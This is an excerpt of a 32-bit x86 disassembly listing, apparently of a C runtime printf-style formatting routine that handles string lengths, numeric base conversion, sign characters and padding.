  40ca9b:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40ca9e:	89 95 a8 fd ff ff    	mov    %edx,-0x258(%ebp)
  40caa4:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
  40caaa:	8b 8d a4 fd ff ff    	mov    -0x25c(%ebp),%ecx
  40cab0:	83 e9 01             	sub    $0x1,%ecx
  40cab3:	89 8d a4 fd ff ff    	mov    %ecx,-0x25c(%ebp)
  40cab9:	85 c0                	test   %eax,%eax
  40cabb:	74 20                	je     0x40cadd
  40cabd:	8b 95 a8 fd ff ff    	mov    -0x258(%ebp),%edx
  40cac3:	33 c0                	xor    %eax,%eax
  40cac5:	66 8b 02             	mov    (%edx),%ax
  40cac8:	85 c0                	test   %eax,%eax
  40caca:	74 11                	je     0x40cadd
  40cacc:	8b 8d a8 fd ff ff    	mov    -0x258(%ebp),%ecx
  40cad2:	83 c1 02             	add    $0x2,%ecx
  40cad5:	89 8d a8 fd ff ff    	mov    %ecx,-0x258(%ebp)
  40cadb:	eb c7                	jmp    0x40caa4
  40cadd:	8b 95 a8 fd ff ff    	mov    -0x258(%ebp),%edx
  40cae3:	2b 55 dc             	sub    -0x24(%ebp),%edx
  40cae6:	d1 fa                	sar    $1,%edx
  40cae8:	89 55 d8             	mov    %edx,-0x28(%ebp)
  40caeb:	eb 5a                	jmp    0x40cb47
  40caed:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  40caf1:	75 08                	jne    0x40cafb
  40caf3:	a1 88 d6 45 00       	mov    0x45d688,%eax
  40caf8:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40cafb:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40cafe:	89 8d ac fd ff ff    	mov    %ecx,-0x254(%ebp)
  40cb04:	8b 95 a4 fd ff ff    	mov    -0x25c(%ebp),%edx
  40cb0a:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
  40cb10:	83 e8 01             	sub    $0x1,%eax
  40cb13:	89 85 a4 fd ff ff    	mov    %eax,-0x25c(%ebp)
  40cb19:	85 d2                	test   %edx,%edx
  40cb1b:	74 1e                	je     0x40cb3b
  40cb1d:	8b 8d ac fd ff ff    	mov    -0x254(%ebp),%ecx
  40cb23:	0f be 11             	movsbl (%ecx),%edx
  40cb26:	85 d2                	test   %edx,%edx
  40cb28:	74 11                	je     0x40cb3b
  40cb2a:	8b 85 ac fd ff ff    	mov    -0x254(%ebp),%eax
  40cb30:	83 c0 01             	add    $0x1,%eax
  40cb33:	89 85 ac fd ff ff    	mov    %eax,-0x254(%ebp)
  40cb39:	eb c9                	jmp    0x40cb04
  40cb3b:	8b 8d ac fd ff ff    	mov    -0x254(%ebp),%ecx
  40cb41:	2b 4d dc             	sub    -0x24(%ebp),%ecx
  40cb44:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  40cb47:	e9 d7 04 00 00       	jmp    0x40d023
  40cb4c:	8d 55 10             	lea    0x10(%ebp),%edx
  40cb4f:	52                   	push   %edx
  40cb50:	e8 eb 08 00 00       	call   0x40d440
  40cb55:	83 c4 04             	add    $0x4,%esp
  40cb58:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
  40cb5e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40cb61:	83 e0 20             	and    $0x20,%eax
  40cb64:	85 c0                	test   %eax,%eax
  40cb66:	74 12                	je     0x40cb7a
  40cb68:	8b 8d a0 fd ff ff    	mov    -0x260(%ebp),%ecx
  40cb6e:	66 8b 95 d0 fd ff ff 	mov    -0x230(%ebp),%dx
  40cb75:	66 89 11             	mov    %dx,(%ecx)
  40cb78:	eb 0e                	jmp    0x40cb88
  40cb7a:	8b 85 a0 fd ff ff    	mov    -0x260(%ebp),%eax
  40cb80:	8b 8d d0 fd ff ff    	mov    -0x230(%ebp),%ecx
  40cb86:	89 08                	mov    %ecx,(%eax)
  40cb88:	c7 85 c0 fd ff ff 01 	movl   $0x1,-0x240(%ebp)
  40cb8f:	00 00 00 
  40cb92:	e9 8c 04 00 00       	jmp    0x40d023
  40cb97:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40cb9e:	8a 55 d4             	mov    -0x2c(%ebp),%dl
  40cba1:	80 c2 20             	add    $0x20,%dl
  40cba4:	88 55 d4             	mov    %dl,-0x2c(%ebp)
  40cba7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40cbaa:	0c 40                	or     $0x40,%al
  40cbac:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40cbaf:	8d 8d d4 fd ff ff    	lea    -0x22c(%ebp),%ecx
  40cbb5:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40cbb8:	83 bd c8 fd ff ff 00 	cmpl   $0x0,-0x238(%ebp)
  40cbbf:	7d 0c                	jge    0x40cbcd
  40cbc1:	c7 85 c8 fd ff ff 06 	movl   $0x6,-0x238(%ebp)
  40cbc8:	00 00 00 
  40cbcb:	eb 34                	jmp    0x40cc01
  40cbcd:	83 bd c8 fd ff ff 00 	cmpl   $0x0,-0x238(%ebp)
  40cbd4:	75 15                	jne    0x40cbeb
  40cbd6:	0f be 55 d4          	movsbl -0x2c(%ebp),%edx
  40cbda:	83 fa 67             	cmp    $0x67,%edx
  40cbdd:	75 0c                	jne    0x40cbeb
  40cbdf:	c7 85 c8 fd ff ff 01 	movl   $0x1,-0x238(%ebp)
  40cbe6:	00 00 00 
  40cbe9:	eb 16                	jmp    0x40cc01
  40cbeb:	81 bd c8 fd ff ff 00 	cmpl   $0x200,-0x238(%ebp)
  40cbf2:	02 00 00 
  40cbf5:	7e 0a                	jle    0x40cc01
  40cbf7:	c7 85 c8 fd ff ff 00 	movl   $0x200,-0x238(%ebp)
  40cbfe:	02 00 00 
  40cc01:	81 bd c8 fd ff ff a3 	cmpl   $0xa3,-0x238(%ebp)
  40cc08:	00 00 00 
  40cc0b:	7e 3b                	jle    0x40cc48
  40cc0d:	68 ea 02 00 00       	push   $0x2ea
  40cc12:	68 40 fe 40 00       	push   $0x40fe40
  40cc17:	6a 02                	push   $0x2
  40cc19:	8b 85 c8 fd ff ff    	mov    -0x238(%ebp),%eax
  40cc1f:	05 5d 01 00 00       	add    $0x15d,%eax
  40cc24:	50                   	push   %eax
  40cc25:	e8 b6 91 ff ff       	call   0x405de0
  40cc2a:	83 c4 10             	add    $0x10,%esp
  40cc2d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40cc30:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40cc34:	74 08                	je     0x40cc3e
  40cc36:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40cc39:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40cc3c:	eb 0a                	jmp    0x40cc48
  40cc3e:	c7 85 c8 fd ff ff a3 	movl   $0xa3,-0x238(%ebp)
  40cc45:	00 00 00 
  40cc48:	8b 55 10             	mov    0x10(%ebp),%edx
  40cc4b:	83 c2 08             	add    $0x8,%edx
  40cc4e:	89 55 10             	mov    %edx,0x10(%ebp)
  40cc51:	8b 45 10             	mov    0x10(%ebp),%eax
  40cc54:	83 e8 08             	sub    $0x8,%eax
  40cc57:	8b 08                	mov    (%eax),%ecx
  40cc59:	8b 50 04             	mov    0x4(%eax),%edx
  40cc5c:	89 8d 98 fd ff ff    	mov    %ecx,-0x268(%ebp)
  40cc62:	89 95 9c fd ff ff    	mov    %edx,-0x264(%ebp)
  40cc68:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40cc6b:	50                   	push   %eax
  40cc6c:	8b 8d c8 fd ff ff    	mov    -0x238(%ebp),%ecx
  40cc72:	51                   	push   %ecx
  40cc73:	0f be 55 d4          	movsbl -0x2c(%ebp),%edx
  40cc77:	52                   	push   %edx
  40cc78:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40cc7b:	50                   	push   %eax
  40cc7c:	8d 8d 98 fd ff ff    	lea    -0x268(%ebp),%ecx
  40cc82:	51                   	push   %ecx
  40cc83:	ff 15 20 da 45 00    	call   *0x45da20
  40cc89:	83 c4 14             	add    $0x14,%esp
  40cc8c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40cc8f:	81 e2 80 00 00 00    	and    $0x80,%edx
  40cc95:	85 d2                	test   %edx,%edx
  40cc97:	74 16                	je     0x40ccaf
  40cc99:	83 bd c8 fd ff ff 00 	cmpl   $0x0,-0x238(%ebp)
  40cca0:	75 0d                	jne    0x40ccaf
  40cca2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40cca5:	50                   	push   %eax
  40cca6:	ff 15 2c da 45 00    	call   *0x45da2c
  40ccac:	83 c4 04             	add    $0x4,%esp
  40ccaf:	0f be 4d d4          	movsbl -0x2c(%ebp),%ecx
  40ccb3:	83 f9 67             	cmp    $0x67,%ecx
  40ccb6:	75 1a                	jne    0x40ccd2
  40ccb8:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40ccbb:	81 e2 80 00 00 00    	and    $0x80,%edx
  40ccc1:	85 d2                	test   %edx,%edx
  40ccc3:	75 0d                	jne    0x40ccd2
  40ccc5:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40ccc8:	50                   	push   %eax
  40ccc9:	ff 15 24 da 45 00    	call   *0x45da24
  40cccf:	83 c4 04             	add    $0x4,%esp
  40ccd2:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40ccd5:	0f be 11             	movsbl (%ecx),%edx
  40ccd8:	83 fa 2d             	cmp    $0x2d,%edx
  40ccdb:	75 12                	jne    0x40ccef
  40ccdd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40cce0:	80 cc 01             	or     $0x1,%ah
  40cce3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40cce6:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40cce9:	83 c1 01             	add    $0x1,%ecx
  40ccec:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40ccef:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40ccf2:	52                   	push   %edx
  40ccf3:	e8 c8 dc ff ff       	call   0x40a9c0
  40ccf8:	83 c4 04             	add    $0x4,%esp
  40ccfb:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40ccfe:	e9 20 03 00 00       	jmp    0x40d023
  40cd03:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40cd06:	0c 40                	or     $0x40,%al
  40cd08:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40cd0b:	c7 85 c4 fd ff ff 0a 	movl   $0xa,-0x23c(%ebp)
  40cd12:	00 00 00 
  40cd15:	e9 81 00 00 00       	jmp    0x40cd9b
  40cd1a:	c7 85 c4 fd ff ff 0a 	movl   $0xa,-0x23c(%ebp)
  40cd21:	00 00 00 
  40cd24:	eb 75                	jmp    0x40cd9b
  40cd26:	c7 85 c8 fd ff ff 08 	movl   $0x8,-0x238(%ebp)
  40cd2d:	00 00 00 
  40cd30:	c7 85 cc fd ff ff 07 	movl   $0x7,-0x234(%ebp)
  40cd37:	00 00 00 
  40cd3a:	eb 0a                	jmp    0x40cd46
  40cd3c:	c7 85 cc fd ff ff 27 	movl   $0x27,-0x234(%ebp)
  40cd43:	00 00 00 
  40cd46:	c7 85 c4 fd ff ff 10 	movl   $0x10,-0x23c(%ebp)
  40cd4d:	00 00 00 
  40cd50:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40cd53:	81 e1 80 00 00 00    	and    $0x80,%ecx
  40cd59:	85 c9                	test   %ecx,%ecx
  40cd5b:	74 1d                	je     0x40cd7a
  40cd5d:	c6 85 bc fd ff ff 30 	movb   $0x30,-0x244(%ebp)
  40cd64:	8b 95 cc fd ff ff    	mov    -0x234(%ebp),%edx
  40cd6a:	83 c2 51             	add    $0x51,%edx
  40cd6d:	88 95 bd fd ff ff    	mov    %dl,-0x243(%ebp)
  40cd73:	c7 45 ec 02 00 00 00 	movl   $0x2,-0x14(%ebp)
  40cd7a:	eb 1f                	jmp    0x40cd9b
  40cd7c:	c7 85 c4 fd ff ff 08 	movl   $0x8,-0x23c(%ebp)
  40cd83:	00 00 00 
  40cd86:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40cd89:	25 80 00 00 00       	and    $0x80,%eax
  40cd8e:	85 c0                	test   %eax,%eax
  40cd90:	74 09                	je     0x40cd9b
  40cd92:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40cd95:	80 cd 02             	or     $0x2,%ch
  40cd98:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40cd9b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40cd9e:	81 e2 00 80 00 00    	and    $0x8000,%edx
  40cda4:	85 d2                	test   %edx,%edx
  40cda6:	74 1d                	je     0x40cdc5
  40cda8:	8d 45 10             	lea    0x10(%ebp),%eax
  40cdab:	50                   	push   %eax
  40cdac:	e8 af 06 00 00       	call   0x40d460
  40cdb1:	83 c4 04             	add    $0x4,%esp
  40cdb4:	89 85 84 fd ff ff    	mov    %eax,-0x27c(%ebp)
  40cdba:	89 95 88 fd ff ff    	mov    %edx,-0x278(%ebp)
  40cdc0:	e9 91 00 00 00       	jmp    0x40ce56
  40cdc5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40cdc8:	83 e1 20             	and    $0x20,%ecx
  40cdcb:	85 c9                	test   %ecx,%ecx
  40cdcd:	74 48                	je     0x40ce17
  40cdcf:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40cdd2:	83 e2 40             	and    $0x40,%edx
  40cdd5:	85 d2                	test   %edx,%edx
  40cdd7:	74 1e                	je     0x40cdf7
  40cdd9:	8d 45 10             	lea    0x10(%ebp),%eax
  40cddc:	50                   	push   %eax
  40cddd:	e8 5e 06 00 00       	call   0x40d440
  40cde2:	83 c4 04             	add    $0x4,%esp
  40cde5:	0f bf c0             	movswl %ax,%eax
  40cde8:	99                   	cltd
  40cde9:	89 85 84 fd ff ff    	mov    %eax,-0x27c(%ebp)
  40cdef:	89 95 88 fd ff ff    	mov    %edx,-0x278(%ebp)
  40cdf5:	eb 1e                	jmp    0x40ce15
  40cdf7:	8d 4d 10             	lea    0x10(%ebp),%ecx
  40cdfa:	51                   	push   %ecx
  40cdfb:	e8 40 06 00 00       	call   0x40d440
  40ce00:	83 c4 04             	add    $0x4,%esp
  40ce03:	25 ff ff 00 00       	and    $0xffff,%eax
  40ce08:	99                   	cltd
  40ce09:	89 85 84 fd ff ff    	mov    %eax,-0x27c(%ebp)
  40ce0f:	89 95 88 fd ff ff    	mov    %edx,-0x278(%ebp)
  40ce15:	eb 3f                	jmp    0x40ce56
  40ce17:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40ce1a:	83 e2 40             	and    $0x40,%edx
  40ce1d:	85 d2                	test   %edx,%edx
  40ce1f:	74 1b                	je     0x40ce3c
  40ce21:	8d 45 10             	lea    0x10(%ebp),%eax
  40ce24:	50                   	push   %eax
  40ce25:	e8 16 06 00 00       	call   0x40d440
  40ce2a:	83 c4 04             	add    $0x4,%esp
  40ce2d:	99                   	cltd
  40ce2e:	89 85 84 fd ff ff    	mov    %eax,-0x27c(%ebp)
  40ce34:	89 95 88 fd ff ff    	mov    %edx,-0x278(%ebp)
  40ce3a:	eb 1a                	jmp    0x40ce56
  40ce3c:	8d 4d 10             	lea    0x10(%ebp),%ecx
  40ce3f:	51                   	push   %ecx
  40ce40:	e8 fb 05 00 00       	call   0x40d440
  40ce45:	83 c4 04             	add    $0x4,%esp
  40ce48:	33 d2                	xor    %edx,%edx
  40ce4a:	89 85 84 fd ff ff    	mov    %eax,-0x27c(%ebp)
  40ce50:	89 95 88 fd ff ff    	mov    %edx,-0x278(%ebp)
  40ce56:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40ce59:	83 e0 40             	and    $0x40,%eax
  40ce5c:	85 c0                	test   %eax,%eax
  40ce5e:	74 3e                	je     0x40ce9e
  40ce60:	83 bd 88 fd ff ff 00 	cmpl   $0x0,-0x278(%ebp)
  40ce67:	7f 35                	jg     0x40ce9e
  40ce69:	7c 09                	jl     0x40ce74
  40ce6b:	83 bd 84 fd ff ff 00 	cmpl   $0x0,-0x27c(%ebp)
  40ce72:	73 2a                	jae    0x40ce9e
  40ce74:	8b 8d 84 fd ff ff    	mov    -0x27c(%ebp),%ecx
  40ce7a:	f7 d9                	neg    %ecx
  40ce7c:	8b 95 88 fd ff ff    	mov    -0x278(%ebp),%edx
  40ce82:	83 d2 00             	adc    $0x0,%edx
  40ce85:	f7 da                	neg    %edx
  40ce87:	89 8d 90 fd ff ff    	mov    %ecx,-0x270(%ebp)
  40ce8d:	89 95 94 fd ff ff    	mov    %edx,-0x26c(%ebp)
  40ce93:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40ce96:	80 cc 01             	or     $0x1,%ah
  40ce99:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40ce9c:	eb 18                	jmp    0x40ceb6
  40ce9e:	8b 8d 84 fd ff ff    	mov    -0x27c(%ebp),%ecx
  40cea4:	89 8d 90 fd ff ff    	mov    %ecx,-0x270(%ebp)
  40ceaa:	8b 95 88 fd ff ff    	mov    -0x278(%ebp),%edx
  40ceb0:	89 95 94 fd ff ff    	mov    %edx,-0x26c(%ebp)
  40ceb6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40ceb9:	25 00 80 00 00       	and    $0x8000,%eax
  40cebe:	85 c0                	test   %eax,%eax
  40cec0:	75 1b                	jne    0x40cedd
  40cec2:	8b 8d 90 fd ff ff    	mov    -0x270(%ebp),%ecx
  40cec8:	8b 95 94 fd ff ff    	mov    -0x26c(%ebp),%edx
  40cece:	83 e2 00             	and    $0x0,%edx
  40ced1:	89 8d 90 fd ff ff    	mov    %ecx,-0x270(%ebp)
  40ced7:	89 95 94 fd ff ff    	mov    %edx,-0x26c(%ebp)
  40cedd:	83 bd c8 fd ff ff 00 	cmpl   $0x0,-0x238(%ebp)
  40cee4:	7d 0c                	jge    0x40cef2
  40cee6:	c7 85 c8 fd ff ff 01 	movl   $0x1,-0x238(%ebp)
  40ceed:	00 00 00 
  40cef0:	eb 1e                	jmp    0x40cf10
  40cef2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40cef5:	24 f7                	and    $0xf7,%al
  40cef7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40cefa:	81 bd c8 fd ff ff 00 	cmpl   $0x200,-0x238(%ebp)
  40cf01:	02 00 00 
  40cf04:	7e 0a                	jle    0x40cf10
  40cf06:	c7 85 c8 fd ff ff 00 	movl   $0x200,-0x238(%ebp)
  40cf0d:	02 00 00 
  40cf10:	8b 8d 90 fd ff ff    	mov    -0x270(%ebp),%ecx
  40cf16:	0b 8d 94 fd ff ff    	or     -0x26c(%ebp),%ecx
  40cf1c:	85 c9                	test   %ecx,%ecx
  40cf1e:	75 07                	jne    0x40cf27
  40cf20:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40cf27:	8d 55 d3             	lea    -0x2d(%ebp),%edx
  40cf2a:	89 55 dc             	mov    %edx,-0x24(%ebp)
  40cf2d:	8b 85 c8 fd ff ff    	mov    -0x238(%ebp),%eax
  40cf33:	8b 8d c8 fd ff ff    	mov    -0x238(%ebp),%ecx
  40cf39:	83 e9 01             	sub    $0x1,%ecx
  40cf3c:	89 8d c8 fd ff ff    	mov    %ecx,-0x238(%ebp)
  40cf42:	85 c0                	test   %eax,%eax
  40cf44:	7f 14                	jg     0x40cf5a
  40cf46:	8b 95 90 fd ff ff    	mov    -0x270(%ebp),%edx
  40cf4c:	0b 95 94 fd ff ff    	or     -0x26c(%ebp),%edx
  40cf52:	85 d2                	test   %edx,%edx
  40cf54:	0f 84 81 00 00 00    	je     0x40cfdb
  40cf5a:	8b 85 c4 fd ff ff    	mov    -0x23c(%ebp),%eax
  40cf60:	99                   	cltd
  40cf61:	52                   	push   %edx
  40cf62:	50                   	push   %eax
  40cf63:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  40cf69:	50                   	push   %eax
  40cf6a:	8b 8d 90 fd ff ff    	mov    -0x270(%ebp),%ecx
  40cf70:	51                   	push   %ecx
  40cf71:	e8 9a 05 00 00       	call   0x40d510
  40cf76:	83 c0 30             	add    $0x30,%eax
  40cf79:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  40cf7f:	8b 85 c4 fd ff ff    	mov    -0x23c(%ebp),%eax
  40cf85:	99                   	cltd
  40cf86:	52                   	push   %edx
  40cf87:	50                   	push   %eax
  40cf88:	8b 95 94 fd ff ff    	mov    -0x26c(%ebp),%edx
  40cf8e:	52                   	push   %edx
  40cf8f:	8b 85 90 fd ff ff    	mov    -0x270(%ebp),%eax
  40cf95:	50                   	push   %eax
  40cf96:	e8 05 05 00 00       	call   0x40d4a0
  40cf9b:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  40cfa1:	89 95 94 fd ff ff    	mov    %edx,-0x26c(%ebp)
  40cfa7:	83 bd 8c fd ff ff 39 	cmpl   $0x39,-0x274(%ebp)
  40cfae:	7e 12                	jle    0x40cfc2
  40cfb0:	8b 8d 8c fd ff ff    	mov    -0x274(%ebp),%ecx
  40cfb6:	03 8d cc fd ff ff    	add    -0x234(%ebp),%ecx
  40cfbc:	89 8d 8c fd ff ff    	mov    %ecx,-0x274(%ebp)
  40cfc2:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40cfc5:	8a 85 8c fd ff ff    	mov    -0x274(%ebp),%al
  40cfcb:	88 02                	mov    %al,(%edx)
  40cfcd:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40cfd0:	83 e9 01             	sub    $0x1,%ecx
  40cfd3:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40cfd6:	e9 52 ff ff ff       	jmp    0x40cf2d
  40cfdb:	8d 55 d3             	lea    -0x2d(%ebp),%edx
  40cfde:	2b 55 dc             	sub    -0x24(%ebp),%edx
  40cfe1:	89 55 d8             	mov    %edx,-0x28(%ebp)
  40cfe4:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40cfe7:	83 c0 01             	add    $0x1,%eax
  40cfea:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40cfed:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40cff0:	81 e1 00 02 00 00    	and    $0x200,%ecx
  40cff6:	85 c9                	test   %ecx,%ecx
  40cff8:	74 29                	je     0x40d023
  40cffa:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40cffd:	0f be 02             	movsbl (%edx),%eax
  40d000:	83 f8 30             	cmp    $0x30,%eax
  40d003:	75 06                	jne    0x40d00b
  40d005:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  40d009:	75 18                	jne    0x40d023
  40d00b:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40d00e:	83 e9 01             	sub    $0x1,%ecx
  40d011:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40d014:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40d017:	c6 02 30             	movb   $0x30,(%edx)
  40d01a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40d01d:	83 c0 01             	add    $0x1,%eax
  40d020:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40d023:	83 bd c0 fd ff ff 00 	cmpl   $0x0,-0x240(%ebp)
  40d02a:	0f 85 ce 01 00 00    	jne    0x40d1fe
  40d030:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40d033:	83 e1 40             	and    $0x40,%ecx
  40d036:	85 c9                	test   %ecx,%ecx
  40d038:	74 4f                	je     0x40d089
  40d03a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40d03d:	81 e2 00 01 00 00    	and    $0x100,%edx
  40d043:	85 d2                	test   %edx,%edx
  40d045:	74 10                	je     0x40d057
  40d047:	c6 85 bc fd ff ff 2d 	movb   $0x2d,-0x244(%ebp)
  40d04e:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  40d055:	eb 32                	jmp    0x40d089
  40d057:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40d05a:	83 e0 01             	and    $0x1,%eax
  40d05d:	85 c0                	test   %eax,%eax
  40d05f:	74 10                	je     0x40d071
  40d061:	c6 85 bc fd ff ff 2b 	movb   $0x2b,-0x244(%ebp)
  40d068:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  40d06f:	eb 18                	jmp    0x40d089
  40d071:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40d074:	83 e1 02             	and    $0x2,%ecx
  40d077:	85 c9                	test   %ecx,%ecx
  40d079:	74 0e                	je     0x40d089
  40d07b:	c6 85 bc fd ff ff 20 	movb   $0x20,-0x244(%ebp)
  40d082:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  40d089:	8b 95 b8 fd ff ff    	mov    -0x248(%ebp),%edx
  40d08f:	2b 55 d8             	sub    -0x28(%ebp),%edx
  40d092:	2b 55 ec             	sub    -0x14(%ebp),%edx
  40d095:	89 95 80 fd ff ff    	mov    %edx,-0x280(%ebp)
  40d09b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40d09e:	83 e0 0c             	and    $0xc,%eax
  40d0a1:	85 c0                	test   %eax,%eax
  40d0a3:	75 1c                	jne    0x40d0c1
  40d0a5:	8d 8d d0 fd ff ff    	lea    -0x230(%ebp),%ecx
  40d0ab:	51                   	push   %ecx
  40d0ac:	8b 55 08             	mov    0x8(%ebp),%edx
  40d0af:	52                   	push   %edx
  40d0b0:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
  40d0b6:	50                   	push   %eax
  40d0b7:	6a 20                	push   $0x20
  40d0b9:	e8 f2 02 00 00       	call   0x40d3b0
  40d0be:	83 c4 10             	add    $0x10,%esp
  40d0c1:	8d 8d d0 fd ff ff    	lea    -0x230(%ebp),%ecx
  40d0c7:	51                   	push   %ecx
  40d0c8:	8b 55 08             	mov    0x8(%ebp),%edx
  40d0cb:	52                   	push   %edx
  40d0cc:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40d0cf:	50                   	push   %eax
  40d0d0:	8d 8d bc fd ff ff    	lea    -0x244(%ebp),%ecx
  40d0d6:	51                   	push   %ecx
  40d0d7:	e8 14 03 00 00       	call   0x40d3f0
  40d0dc:	83 c4 10             	add    $0x10,%esp
  40d0df:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40d0e2:	83 e2 08             	and    $0x8,%edx
  40d0e5:	85 d2                	test   %edx,%edx
  40d0e7:	74 26                	je     0x40d10f
  40d0e9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40d0ec:	83 e0 04             	and    $0x4,%eax
  40d0ef:	85 c0                	test   %eax,%eax
  40d0f1:	75 1c                	jne    0x40d10f
  40d0f3:	8d 8d d0 fd ff ff    	lea    -0x230(%ebp),%ecx
  40d0f9:	51                   	push   %ecx
  40d0fa:	8b 55 08             	mov    0x8(%ebp),%edx
  40d0fd:	52                   	push   %edx
  40d0fe:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
  40d104:	50                   	push   %eax
  40d105:	6a 30                	push   $0x30
  40d107:	e8 a4 02 00 00       	call   0x40d3b0
  40d10c:	83 c4 10             	add    $0x10,%esp
  40d10f:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40d113:	0f 84 a4 00 00 00    	je     0x40d1bd
  40d119:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  40d11d:	0f 8e 9a 00 00 00    	jle    0x40d1bd
  40d123:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40d126:	89 8d 7c fd ff ff    	mov    %ecx,-0x284(%ebp)
  40d12c:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40d12f:	89 95 78 fd ff ff    	mov    %edx,-0x288(%ebp)
  40d135:	8b 85 78 fd ff ff    	mov    -0x288(%ebp),%eax
  40d13b:	8b 8d 78 fd ff ff    	mov    -0x288(%ebp),%ecx
  40d141:	83 e9 01             	sub    $0x1,%ecx
  40d144:	89 8d 78 fd ff ff    	mov    %ecx,-0x288(%ebp)
  40d14a:	85 c0                	test   %eax,%eax
  40d14c:	74 6d                	je     0x40d1bb
  40d14e:	8b 95 7c fd ff ff    	mov    -0x284(%ebp),%edx
  40d154:	66 8b 02             	mov    (%edx),%ax
  40d157:	66 89 85 56 fd ff ff 	mov    %ax,-0x2aa(%ebp)
  40d15e:	66 8b 8d 56 fd ff ff 	mov    -0x2aa(%ebp),%cx
  40d165:	51                   	push   %ecx
  40d166:	8d 95 74 fd ff ff    	lea    -0x28c(%ebp),%edx
  40d16c:	52                   	push   %edx
  40d16d:	8b 85 7c fd ff ff    	mov    -0x284(%ebp),%eax
  40d173:	83 c0 02             	add    $0x2,%eax
  40d176:	89 85 7c fd ff ff    	mov    %eax,-0x284(%ebp)
  40d17c:	e8 af 0b 00 00       	call   0x40dd30
  40d181:	83 c4 08             	add    $0x8,%esp
  40d184:	89 85 70 fd ff ff    	mov    %eax,-0x290(%ebp)
  40d18a:	83 bd 70 fd ff ff 00 	cmpl   $0x0,-0x290(%ebp)
  40d191:	7f 02                	jg     0x40d195
  40d193:	eb 26                	jmp    0x40d1bb
  40d195:	8d 8d d0 fd ff ff    	lea    -0x230(%ebp),%ecx
  40d19b:	51                   	push   %ecx
  40d19c:	8b 55 08             	mov    0x8(%ebp),%edx
  40d19f:	52                   	push   %edx
  40d1a0:	8b 85 70 fd ff ff    	mov    -0x290(%ebp),%eax
  40d1a6:	50                   	push   %eax
  40d1a7:	8d 8d 74 fd ff ff    	lea    -0x28c(%ebp),%ecx
  40d1ad:	51                   	push   %ecx
  40d1ae:	e8 3d 02 00 00       	call   0x40d3f0
  40d1b3:	83 c4 10             	add    $0x10,%esp
